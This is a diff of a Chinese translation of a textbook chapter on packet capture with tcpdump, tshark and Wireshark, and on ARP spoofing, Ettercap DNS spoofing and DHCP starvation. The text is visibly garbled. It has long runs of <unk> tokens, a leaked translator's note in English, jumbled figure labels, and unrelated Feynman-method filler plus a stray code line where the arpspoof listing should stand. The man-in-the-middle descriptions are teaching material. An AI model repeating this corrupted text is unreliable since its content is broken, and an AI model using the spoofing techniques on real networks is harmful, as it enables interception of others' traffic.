-目前我们只看到协议头部。并没有看到任何负载（payload）数据。我们可以使用 `-X` 参数来查看负载。该参数会对报文的负载进行十六进制（hex）转储。十六进制转储会以十六进制形式显示每个字节，同时提供每个字节的 ASCII 解码。如果 ASCII 值是可打印字符，则右侧会显示该可打印字符。即使看到可打印字符，该字节在所用协议中的含义未必是该字符，可能只是该字节的数值。
+目前我们只看到协议头部。并没有看到任何负载（`payload`）数据。我们可以使用 `-X` 参数来查看负载。该参数会对报文的负载进行十六进制（`hex`）转储。十六进制转储会以十六进制形式显示每个字节，同时提供每个字节的 ASCII 解码。如果 ASCII 值是可打印字符，则右侧会显示该可打印字符。即使看到可打印字符，该字节在所用协议中的含义未必是该字符，可能只是该字节的数值。
 
-**数据包的十六进制表示**
+## 数据包的十六进制表示
 
 ```
 root@quiche:~# tcpdump -i eth0 -X
@@ -8443,83 +9308,94 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 
 你也会在命令行中看到 `-i eth0`。这告诉 `tcpdump` 在哪个接口上捕获数据包。如果不指定，`tcpdump` 会使用默认接口。在大多数情况下，系统只有一个接口。有些系统有多个接口，不过。你可能想在非默认接口上捕获。这意味着你需要告诉 `tcpdump` 使用哪个接口。这里看不到任何层 4 头部信息，因为没有在启动 `tcpdump` 时加入 `-v` 参数，表示我们想要更详细的输出。你可以在启动 `tcpdump` 时添加详细程度参数。你将得到层 4 信息以及数据包的负载。
 
+- 我们已经在命令行上查看了 `tcpdump` 的输出。我们不必在命令行上查看它，尤其是当它难以跟上时。在繁忙的网络上，你会看到消息飞速飞过，却无法及时跟上。最好是将数据包写入文件。我们可以使用 `-w` 参数在命令行上完成此操作，如下面的列表所示。这告诉 `tcpdump` 将数据包写入指定的文件。它以数据包捕获（PCAP）文件格式进行写入，其中包含捕获会话的元数据。你这里看到的内容之前是看不到的，因为你之前只看到了捕获的顶部。要停止捕获，需要使用 Ctrl+C（`^C`）终止 `tcpdump`。
 
+## 使用 `tcpdump` 将数据包写入文件
 
-
--   [我们已经在命令行上查看了 `tcpdump` 的输出。我们不必在命令行上查看它，尤其是当它难以跟上时。在繁忙的网络上，你会看到消息飞速飞过，却无法及时跟上。最好是将数据包写入文件。我们可以使用 `‑w` 参数在命令行上完成此操作，如下面的列表所示。这告诉 `tcpdump` 将数据包写入指定的文件。它以数据包捕获（PCAP）文件格式进行写入，其中包含捕获会话的元数据。你这里看到的内容之前是看不到的，因为你之前只看到了捕获的顶部。要停止捕获，需要使用 Ctrl+C（^C）终止 `tcpdump`。
-
-**使用 `tcpdump` 将数据包写入文件**
-
-```
 ```
 root@quiche:~# tcpdump -w file.pcap
+
 tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+
 ^C116 packets captured
+
 119 packets received by filter
+
 0 packets dropped by kernel
 ```
 
-一旦文件写入完成，我们还有几种选择。任何能够解析 PCAP 文件的程序都可以打开我们已写入的文件。我们也可以使用 `tcpdump` 打开文件并显示其内容。为此，我们需要使用 `‑r` 参数。该参数读取文件并可以提供额外的命令行参数来指定 `tcpdump` 如何显示输出。
+一旦文件写入完成，我们还有几种选择。任何能够解析 PCAP 文件的程序都可以打开我们已写入的文件。我们也可以使用 `tcpdump` 打开文件并显示其内容。为此，我们需要使用 `-r` 参数。该参数读取文件并可以提供额外的命令行参数来指定 `tcpdump` 如何显示输出。
 
-### *tshark*
+## `tshark`
 
 当然，`tcpdump` 并不是唯一可以在命令行上捕获数据包的程序。Wireshark（我们稍后会查看）包含的 `tshark` 程序也可以用于捕获数据包。在下面的代码列表中，你会看到程序在没有任何参数的情况下运行。`tshark` 会提示以 root 身份运行可能危险。它这样提示是因为存在过往数据包捕获程序受到漏洞影响的案例，精心构造的数据包可能导致任意代码运行。这意味着攻击者可以使 `tshark` 被入侵并运行其提供的代码。除此之外，输出与 `tcpdump` 非常相似。最终，能够显示的数据量是有限的，而真正需要查看的数据则在捕获包的深层。
 
-**使用 `tshark` 捕获流量**
+## 使用 `tshark` 捕获流量
 
 ```
-```
-root@quiche:~# tshark
-Running as user "root" and group "root". This could be dangerous.
-tshark: Lua: Error during loading:
-  [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
-Capturing on 'eth0'
-     1 0.000000000 SamsungE_94:ba:57 → Broadcast    ARP 60 Who has 192.168.86.1? Tell 192.168.86.22
-     2 0.196881172 Humax_1c:3b:db → Spanning-tree-(for-bridges)_00 STP 60 Conf. Root = 28672/0/2c:08:8c:1c:3b:db  Cost = 0  Port = 0x8001
-     3 0.346721551 192.168.86.22 → 224.0.0.7    UDP 242 8001 → 8001 Len=200
-     4 0.941773953 192.168.86.57 → 192.168.86.26 SSH 206 Server: Encrypted packet (len=140)
-     5 0.941825969 192.168.86.57 → 192.168.86.26 SSH 246 Server: Encrypted packet (len=180)
-     6 0.966582385 192.168.86.57 → 192.168.86.26 SSH 182 Server: Encrypted packet (len=116)
-     7 1.033015866 192.168.86.57 → 192.168.86.26 TCP 182 [TCP Retransmission] 22 → 64631 [PSH, ACK] Seq=321 Ack=1 Win=315 Len=116 TSval=4284989880 TSecr=1235189447
- 
- 
-```
+
+
+
+### 使用 `tshark` 打印字段
 
 仅仅因为存在一些默认项你可能想看到，并不意味着用户不能更精细地指定显示内容。`tshark` 在此方面远胜于 `tcpdump`，是使用 `tshark` 而非 `tcpdump` 的主要原因。下面的代码列表展示了如何选择想要显示的单个域。这里我们打印帧编号、IP 地址、IP 服务类型字段以及 IP 生存时间字段。
 
-**使用 `tshark` 打印字段**
-
-```
 ```
 root@quiche:~# tshark -Tfields -e frame.number  -e ip.src -e ip.dst -e ip.tos -e ip.ttl
+
 Running as user "root" and group "root". This could be dangerous.
+
 tshark: Lua: Error during loading:
+
   [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
+
 Capturing on 'eth0'
+
  1    192.168.86.26    192.168.86.57        64
+
  2
+
  3    192.168.86.57    192.168.86.26        64
+
  4    192.168.86.26    192.168.86.57        64
+
  5    192.168.86.22    224.0.0.7        1
+
  6    192.168.86.57    192.168.86.26        64
+
  7    192.168.86.57    192.168.86.26        64
+
  8    192.168.86.57    192.168.86.26        64
+
  9    192.168.86.26    192.168.86.57        64
+
  10    192.168.86.26    192.168.86.57        64
+
  11    192.168.86.26    192.168.86.57        64
+
  12
+
  13
+
  14    192.168.86.57    192.168.86.26        64
+
  15    192.168.86.57    192.168.86.26        64
+
  16    192.168.86.57    192.168.86.26        64
+
  17    192.168.86.57    192.168.86.26        64
+
  18    192.168.86.57    192.168.86.26        64
+
  19    192.168.86.57    192.168.86.26        64
+
  20    192.168.86.57    192.168.86.26        64
+
  21    192.168.86.57    192.168.86.26        64
- 
- 
 ```
+
+
+
 
 有数百个字段可供使用。从前面的示例可以看出，你可以通过 `‑e` 参数继续添加字段。其余大多数命令行参数与 `tcpdump` 使用的参数相同。你可以设置快照长度、选择网络接口，并且也可以写入文件。这些参数与前面 `tcpdump` 示例中使用的参数相同。
 
@@ -8533,21 +9409,7 @@ Wireshark 是一个基于 GUI 的数据包捕获程序。正如前面所述，�
 
 **FIGURE 9.1** Wireshark frames list
 
-列标题（可配置）包括帧编号、相对于捕<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>:32: dofile has been disabled due to running Wireshark as superuser.<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>:1.0) and the content inside is translated into Chinese.
-
-We need to translate the English text to Chinese, preserving formatting, preserving code blocks, etc. Also need to keep the [content]...[/content] tags.
-
-We need to translate the English text (the content inside the content tags) into Chinese, preserving formatting.
-
-Let's parse the original content:
-
-It starts with "So far,<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>
-
-
-
--   [Wireshark](https://wiki.example.org/feynmans_learning_method) 不仅会给出你捕获的帧列表，让你看到谁在与谁通信，还提供了完整的协议解码。Figure 9.2 中的两个协议已展开。Wireshark 知道如何解码几乎所有你能想象的协议。Figure 9.2 中你能看到的只是针对两个常见协议（IP 和 TCP）的简单解码。每个字段都已拆分，除了提供字段名称和值外，还提供了其含义。例如，如果仅查看包含 IP 版本和头部长度的字节，你会看到 0x45。这只是字节值，但该字节在两个 nibble（4 字节值）中包含两个独立的数据。第一个是版本，为 4。第二个是头部长度，显示为 5，如果不熟悉 IP 协议，可能会误以为长度是 5。Wireshark 知道需要将该值乘以 4，因为该字段实际表示 32 位（4 字节）双字的数量。因此，Wireshark 会显示头部长度为 20。
-
-这让你更容易理解所看到的内容。Wireshark 还知道许多其他协议，甚至可以帮助你理解加密通信，程度上如此。如果你查看帧列表，就能看到用于设置 TLS 会话加密的不同帧。在 Wireshark 窗口中间的解码面板中打开相应的协议，你可以看到具体内容，如 Figure 9.3 所示。你可以看到正在使用的 TLS 版本以及正在发送的具体消息。这是因为消息尚未完全加密，仅凭头部信息即可判断。
+列标题（可配置）包括帧编号、相对于捕获的时间戳、源地址、目的地址、协议、长度和信息。
 
 ![FIGURE 9.2 Protocol details](img/c09f002.png)
 
@@ -8587,24 +9449,28 @@ Figure 9.6 显示捕获过滤器，但 Wireshark 也会在构建显示过滤器�
 
 例如，前文提到的 `tcpdump` 示例实际上是在一个 Linux 系统上（我有一个简单的提示符，说实话）通过 SSH 连接到该系统时捕获的。当你通过 SSH 连接到系统并运行数据包捕获时，绝大多数数据包都是 SSH 数据包。你真正关心的流量会被 SSH 流量淹没。想一想：你运行 `tcpdump` 后，它会向你发送一个消息表明正在运行，`tcpdump` 捕获一个数据包并将其显示。显示时，SSH 数据包中包含要发送给你的显示文本，这段文本被捕获并发送给你。如此往复。要捕获有意义的流量而非全部 SSH 包，实际使用的命令应为 `tcpdump not port 22`。
 
-
-
-
--   你可以看到 `tcpdump` 的输出，没有任何过滤，`tcpdump` 通过 SSH 会话运行。这是一个小样本。你会发现，SSH 和 DNS 请求是发送的消息，因为每个捕获的数据包在显示之前都必须将 IP 地址解析为主机名。你可以循环这个过程很久。在杀死捕获的两秒钟内，就捕获了超过 4,000 个数据包。
+你可以看到 `tcpdump` 的输出，没有任何过滤，`tcpdump` 通过 SSH 会话运行。这是一个小样本。你会发现，SSH 和 DNS 请求是发送的消息，因为每个捕获的数据包在显示之前都必须将 IP 地址解析为主机名。你可以循环这个过程很久。在杀死捕获的两秒钟内，就捕获了超过 4,000 个数据包。
 
 # 运行 `tcpdump` 而不使用过滤
 
 ```
- root@quiche:~# tcpdump
- tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
- listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
- 18:32:07.835797 IP quiche.lan.ssh> yazpistachio.lan.64631: Flags [P.], seq 3616191731:3616191919, ack 453098787, win 315, options [nop,nop,TS val 16893480 ecr 1259709774], length 188
- 18:32:07.836406 IP quiche.lan.60511> testwifi.here.domain: 58726+ PTR? 26.86.168.192.in-addr.arpa. (44)
- 18:32:07.838352 IP testwifi.here.domain> quiche.lan.60511: 58726* 1/0/0 PTR yazpistachio.lan. (100)
- 18:32:07.838530 IP quiche.lan.60657> testwifi.here.domain: 4670+ PTR? 57.86.168.192.in-addr.arpa. (44)
- 18:32:07.840275 IP testwifi.here.domain> quiche.lan.60657: 4670* 1/0/0 PTR quiche.lan. (94)
- 18:32:07.840505 IP quiche.lan.ssh> yazpistachio.lan.64631: Flags [P.], seq 188:408, ack 1, win 315, options [nop,nop,TS val 16893485 ecr 1259709774], length 220
- 
+root@quiche:~# tcpdump
+
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+
+18:32:07.835797 IP quiche.lan.ssh> yazpistachio.lan.64631: Flags [P.], seq 3616191731:3616191919, ack 453098787, win 315, options [nop,nop,TS val 16893480 ecr 1259709774], length 188
+
+18:32:07.836406 IP quiche.lan.60511> testwifi.here.domain: 58726+ PTR? 26.86.168.192.in-addr.arpa. (44)
+
+18:32:07.838352 IP testwifi.here.domain> quiche.lan.60511: 58726* 1/0/0 PTR yazpistachio.lan. (100)
+
+18:32:07.838530 IP quiche.lan.60657> testwifi.here.domain: 4670+ PTR? 57.86.168.192.in-addr.arpa. (44)
+
+18:32:07.840275 IP testwifi.here.domain> quiche.lan.60657: 4670* 1/0/0 PTR quiche.lan. (94)
+
+18:32:07.840505 IP quiche.lan.ssh> yazpistachio.lan.64631: Flags [P.], seq 188:408, ack 1, win 315, options [nop,nop,TS val 16893485 ecr 1259709774], length 220
 ```
 
 你可以组合不同的过滤原语。例如，下面的代码片段展示了如何捕获来自或发送到主机 192.168.86.1 的 TCP 数据包。为了使复杂过滤更清晰，可以使用括号来隔离参数。你会注意到这里使用了反斜杠，以确保 Linux 终端不会尝试解释它们，它们会作为括号传递给 `tcpdump`。
@@ -8612,16 +9478,28 @@ Figure 9.6 显示捕获过滤器，但 Wireshark 也会在构建显示过滤器�
 **使用 BPF 的复杂过滤**
 
 ```
- root@quiche:~# tcpdump tcp and \(host 192.168.86.1\)
- tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
- listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
- 18:41:33.287262 IP quiche.lan.43790> testwifi.here.http: Flags [S], seq 674275431, win 29200, options [mss 1460,sackOK,TS val 2412954967 ecr 0,nop,wscale 7], length 0
+root@quiche:~# tcpdump tcp and \(host 192.168.86.1\)
+
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+
+18:41:33.287262 IP quiche.lan.43790> testwifi.here.http: Flags [S], seq 674275431, win 29200, options [mss 1460,sackOK,TS val 2412954967 ecr 0,nop,wscale 7], length 0
+```
+
+
+
+
+```
  18:41:33.288206 IP testwifi.here.http> quiche.lan.43790: Flags [S.], seq 239316039, ack 674275432, win 28960, options [mss 1460,sackOK,TS val 235265600 ecr 2412954967,nop,wscale 7], length 0
+
  18:41:33.288269 IP quiche.lan.43790> testwifi.here.http: Flags [.], ack 1, win 229, options [nop,nop,TS val 2412954968 ecr 235265600], length 0
+
  18:41:37.111956 IP quiche.lan.43790> testwifi.here.http: Flags [F.], seq 1, ack 1, win 229, options [nop,nop,TS val 2412958792 ecr 235265600], length 0
+
  18:41:37.113495 IP testwifi.here.http> quiche.lan.43790: Flags [F.], seq 1, ack 2, win 227, options [nop,nop,TS val 235265982 ecr 2412958792], length 0
+
  18:41:37.113515 IP quiche.lan.43790> testwifi.here.http: Flags [.], ack 2, win 229, options [nop,nop,TS val 2412958793 ecr 235265982], length 0
- 
 ```
 
 请记住，当你在命令行上使用 `tcpdump` 进行 BPF 时，你使用的是捕获过滤器。这意味着你不会看到那些不经过过滤的数据包。如果你将捕获写入文件，同样只会保存经过过滤的数据包。如果你计划在后续对捕获文件进行分析，请确保以后不需要那些被过滤掉的数据包。在应用过滤前，请仔细考虑所使用的过滤条件。
@@ -8634,7 +9512,7 @@ Figure 9.6 显示捕获过滤器，但 Wireshark 也会在构建显示过滤器�
 
 在 Cisco 设备上，配置端口镜像的功能称为 Switched Port Analyzer (SPAN)。当你设置端口镜像时，你实际上是在配置一个 SPAN 端口，因而这段过程常被称为 *port spanning*。其他交换机厂商可能使用不同的术语来描述这一过程。
 
-镜像端口时需要考虑的一个因素是 **oversubscription**（过度订阅）。如果你有五个 1 Gbps 的交换机端口并且把它们全部镜像到一个 1 Gbps 的端口，就会出现过度订阅，导致接收端口可能丢弃数据包，捕获到的流量会变得随机。
+镜像端口时需要考虑的一个因素是 **oversubscription**（过度订阅）。如果你有五个 1 Gbps 的交换机端口并且把它们全部镜像到一个 1 Gbps 的端口，就会出现过度订阅，导致接收端口可能丢弃数据包，捕获到的流量会变得随机。
 
 ### 侦测 Sniffer
 
@@ -8642,14 +9520,23 @@ Figure 9.6 显示捕获过滤器，但 Wireshark 也会在构建显示过滤器�
 
 ```
 en0: flags=8963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
+
         options=50b<RXCSUM,TXCSUM,VLAN_HWTAGGING,AV,CHANNEL_IO>
+
         ether 14:98:77:31:b2:33
+
         inet6 fe80::10c6:713a:e86f:556d%en0 prefixlen 64 secured scopeid 0x7
+
         inet 192.168.1.144 netmask 0xffffff00 broadcast 192.168.1.255
+
         inet6 2601:18d:8b7f:e33a::52 prefixlen 64 dynamic
+
         inet6 fd23:5d5f:cd75:40d2:87:38bc:9448:3407 prefixlen 64 autoconf secured
+
         nd6 options=201<PERFORMNUD,DAD>
+
         media: autoselect (1000baseT <full-duplex,flow-control,energy-efficient-ethernet)
+
         status: active
 ```
 
@@ -8657,17 +9544,25 @@ en0: flags=8963<UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
 
 ```
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+
         inet 192.168.1.128  netmask 255.255.255.0  broadcast 192.168.1.255
+
         inet6 fd23:5d5f:cd75:40d2:8922:b227:ed41:59a1  prefixlen 64  scopeid 0x0<global>
+
         inet6 fd23:5d5f:cd75:40d2:20c:29ff:fee9:f642  prefixlen 64  scopeid 0x0<global>
+
         inet6 fe80::20c:29ff:fee9:f642  prefixlen 64  scopeid 0x20<link>
+
         ether 00:0c:29:e9:f6:42  txqueuelen 1000  (Ethernet)
+
         RX packets 9145  bytes 6754039 (6.4 MiB)
+
         RX errors 0  dropped 0  overruns 0  frame 0
+
         TX packets 4214  bytes 913545 (892.1 KiB)
+
         TX errors 0  dropped 0 overruns 0 carrier 0  collisions 0
-
-
+```
 
 -   [新的获取接口地址信息的方式](https://example.org/ip_a) 也不能显示接口是否处于混 promiscuous 模式。对获取接口链路状态的 `ip link` 也是如此。当然，Windows 上的 `ipconfig` 与 Unix 类系统上的 `ipconfig` 功能略有不同。它仅提供 IP 配置，而非接口配置，因此同样看不到接口是否处于混 promiscuous 模式。
 
@@ -8677,7 +9572,7 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 -   最后，你可以观察到 ARP 欺骗等欺骗攻击。入侵检测系统以及其他网络监控工具（如查看交换机的 packETH）也会注意到这种情况。如果在网络中看到大量 ARP 报文，尤其是 ARP 回复而没有对应的请求，则可以确定正在发生 ARP 欺骗攻击。这可能表明有人在网络上捕获数据包。
 
-**数据包分析**
+### 数据包分析
 
 最终，数据包分析可能是你最初捕获数据包的主要原因。获取数据包后，你会希望更深入地检查它们，包括过滤、跟随通信流以及查看统计信息和其他可视化内容。这里 Wireshark 表现出色，能够帮助你完成这些任务。正如前面所述，Wireshark 完全理解协议，这意味着它不仅能够解码协议，还能指出可能的协议违规之处。还有其他许多地方，Wireshark 能让阅读数据包捕获内容更加轻松。
 
@@ -8693,9 +9588,19 @@ Wireshark 还具备展示数据包捕获统计信息的强大功能。Statistics
 
 另一个值得关注的 Statistics 菜单项是 Conversations 视图。它显示数据包捕获中所有端点之间的对话。每一层的对话集合不同，因为层 2 的对话与 IP 地址对话不同。任何从本地网络向外部传出的 IP 对话都会在本地网关上产生层 2 对话。这意味着你可能会看到的以太网对话少于 IP 对话。此外，TCP 对话与 IP 对话也不同，可能会有多个端口对之间的多组对话。这在本地浏览器向 web 服务器建立多个连接以请求图像、HTML 页面和其他资源时尤为常见，这些资源共同参与页面渲染。Figure 9.11 展示了数据包捕获中的 Conversations 统计信息。
 
-![FIGURE 9.10 Protocol hierarchy](img/c09f0010.png)
+![FIGURE 9.11 Conversations statistics](img/c09f0011.png)
 
-**FIGURE 9.7** 数据包分析
+**FIGURE 9.9**
+
+最后一个要查看的功能在“分析”菜单中。Wireshark 在接收到帧和数据包后会对其进行分析。我们之前通过查看帧列表和颜色来观察这些分析。此外，当我们查看协议解码时，可以看到 Wireshark 识别出的信息在方括号中出现错误的情况。你不需要浏览整个数据包捕获文件，逐个查找错误。相反，前往“分析”菜单，选择“专家信息”，即可查看 Wireshark 标记为问题的所有帧。如图 9.12 所示：
+
+![FIGURE 9.10 Protocol Hierarchy Statistics](img/c09f010.png)
+
+**FIGURE 9.10**
+
+![FIGURE 9.11 Conversations statistics](img/c09f011.png)
+
+**FIGURE 9.11**
 
 Wireshark 会自动完成那些会让你感到麻烦的计算。例如，当 TCP 连接建立时，会生成序列号，为了防止欺骗，TCP 连接的初始序列号应为随机。序列号为 4 字节，数值很大。序列号根据传输的字节数递增。如果你自己手动进行此加法运算，需要花费时间跟踪序列号和确认号。相反，Wireshark 为你提供相对序列号，使其更易于使用。根据 Wireshark，第一个序列号为 1。相对序列号随后按预期递增。Figure 9.8 展示了带有相对序列号的 TCP 头部。
 
@@ -8711,10 +9616,7 @@ Wireshark 还具备展示数据包捕获统计信息的强大功能。Statistics
 
 ![FIGURE 9.11 Conversations statistics](img/c09f0011.png)
 
-
-
-
-# FIGURE 9.9
+**FIGURE 9.9**
 
 最后一个要查看的功能在“分析”菜单中。Wireshark 在接收到帧和数据包后会对其进行分析。我们之前通过查看帧列表和颜色来观察这些分析。此外，当我们查看协议解码时，可以看到 Wireshark 识别出的信息在方括号中出现错误的情况。你不需要浏览整个数据包捕获文件，逐个查找错误。相反，前往“分析”菜单，选择“专家信息”，即可查看 Wireshark 标记为问题的所有帧。如图 9.12 所示：
 
@@ -8734,13 +9636,15 @@ Wireshark 还具备展示数据包捕获统计信息的强大功能。Statistics
 
 ### ARP Spoofing
 
+
+
 **The Address Resolution Protocol (ARP) has two stages.** The first is the request, where a system knows an IP address but doesn't know the corresponding MAC address. It sends an ARP request asking for the system with the IP address to respond with its MAC address. The response is the system replying, indicating its MAC address to the requestor. There is nothing to authenticate that request, though. In theory, anyone could respond to that request with their MAC address to get the requesting system to send the message to the attacker's/spoofer's address. We could make it even easier by simply not waiting for the request to begin with and just sending the reply.
 
-To be efficient, systems will take any ARP responses, even if they didn't ask, and cache the mapping. This keeps them from having to ask for the MAC address should they ever need it. This is a feature we can take advantage of. We could just send out ARP responses, mapping whatever IP address on the network we want to our MAC address. This would get all systems on the local network sending messages to us, as our address is in their ARP cache. The process of just sending out ARP responses without a corresponding ARP request is called *gratuitous ARP*, meaning it's an ARP message that wasn't asked for.
+To be efficient, systems will take any ARP responses, even if they didn't ask, and cache the mapping. This keeps them from having to ask for the MAC address should they ever need it. This is a feature we can take advantage of. We could just send out ARP responses, mapping whatever IP address on the network we want to our MAC address. This would get all systems on the local network sending messages to us, as our address is in their ARP cache. The process of just sending out ARP responses without a corresponding ARP request is called `gratuitous ARP`, meaning it's an ARP message that wasn't asked for.
 
 One of the problems we have is the length of time ARP entries are cached for. On Linux systems, the default cache length is 60 seconds. You can check it from an entry in the `/proc` pseudo file system, as you can see in the following code listing. You could also change the behavior by replacing the 60 with another value. On Windows systems, the cache time is different. Microsoft opted to follow RFC 4861, which applies to IPv6, for the IPv4 implementation. Starting with Windows Vista, Microsoft has a base time of 30,000 milliseconds, which is multiplied by a random value between .5 and 1.5 to get the cache duration. This means it's different from one system to another and also from one boot to another.
 
-**ARP Cache Duration on Linux**
+## ARP Cache Duration on Linux
 
 ```
 cat /proc/sys/net/ipv4/neigh/default/gc_stale_time
@@ -8751,25 +9655,21 @@ Because the cache can time out quickly, we have to keep sending out our gratuito
 
 There are a few programs that can be used to handle ARP spoofing. One of them, `arpspoof`, has been around for a long time now. It was written by Dug Song, who also wrote a program called `fragroute`, which is useful in its own way. Using `arpspoof`, we can inject ourselves in between two systems on the network. We can tell `arpspoof` which two IP addresses we want to pretend to be. It takes care of the rest for us. In the following code listing, you can see a run of `arpspoof` where I've selected the default gateway on my network to be the one I spoof. This means I get messages that are destined for the default gateway, so anything that's going off‑net gets sent to the system running `arpspoof`. You'll see the gratuitous ARP responses being sent. They get sent out every few seconds to ensure that no ARP cache entries age out. On some Linux systems, such as Kali Linux, you will need to install `arpspoof` along with other sniffing tools in a package called `dsniff`.
 
-**Using `arpspoof`**
+## Using `arpspoof`
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者`Richard Feynman`。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，`难以遗忘`。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
 一旦 DNS 就位后，我们需要回去配置 Ettercap 来拦截流量。这与之前的步骤相同。我们需要嗅探流量，以便 Ettercap 能够看到请求。我们还需要使用 ARP 欺骗攻击，将网络上的流量引向我们的系统，从而能够看到 DNS 请求。一旦进入 ARP 欺骗阶段，就可以在插件菜单中选择“管理插件”。从那里，可以启用 DNS 欺骗插件。这会自动加载之前编辑的 `etter.dns` 文件。
 
 在下面的代码块中，你会看到 Ettercap 为任何已捕获的请求所写出的日志。虽然前面的代码块中的条目是添加的，但文件中没有删除任何默认条目。Microsoft 的域名是被重定向的主机之一。在这种情况下，它并不是被重定向到我们的本地系统，而是被重定向到互联网上的另一个系统。由于我们使用的是 DNS，主机不必在本地网络内。DNS 会返回一个 IP 地址，请求系统会尝试连接到该 IP。唯一的原因我们需要本地访问是为了捕获请求。一旦请求被捕获并响应，所有流量都属于第 3 层及以上。
 
-**Ettercap DNS Spoof Log**
+## Ettercap DNS Spoof Log
 
 ```
 SEND L3 ERROR: 246 byte packet (0800:06) destined to 192.168.86.26 was not forwarded (libnet_write_raw_ipv4(): -1 bytes written (Network is unreachable))
@@ -8788,7 +9688,7 @@ dns_spoof: A [browser.pipe.aria.microsoft.com] spoofed to [107.170.40.56]
 
 之所以这能工作，即使 DNS 请求仍然发送到合法的 DNS 服务器并收到响应，这是因为 DNS 使用 UDP，所以不存在连接。UDP 请求发出后，UDP 响应返回。系统可能会发送多个请求，因为 UDP 没有保证请求一定能到达 DNS 服务器。第一个收到的响应将被系统使用。由于 Ettercap 系统在本地网络，而 DNS 服务器很可能不在本地，Ettercap 系统返回的 DNS 响应应当是第一个到达的。随后发送到请求系统的响应将被忽略。到那时，`etter.dns` 中配置的地址已经被发送回请求系统，并在该系统的 DNS 缓存中填充。
 
-### DHCP 星 vation 攻击
+## DHCP 星 vation 攻击
 
 另一种获取终端用户信息的技术叫做 DHCP 星 vation 攻击。该攻击针对动态分配给终端的 IPv4 地址。一次 DHCP 星 vation 攻击可能产生两种恶意结果，如图 Figure 9.15 所示。在 DHCP 星 vation 攻击中，攻击者向 DHCP 服务器发送大量的 DHCPDISCOVER 消息。这些消息发送到广播地址 255.255.255.255。DHCP 服务器会向客户端返回报价。在此情形下，服务器会持续发送报价，保留该客户端的 IP 地址，期待一个永远不会到来的 ACK。当 DHCP 服务器耗尽可分配的 IP 地址时，就会出现拒绝服务（DoS）攻击，导致合法终端无法获取 IP 地址。
 
@@ -8798,7 +9698,7 @@ dns_spoof: A [browser.pipe.aria.microsoft.com] spoofed to [107.170.40.56]
 
 **FIGURE 9.15** DHCP starvation attack
 
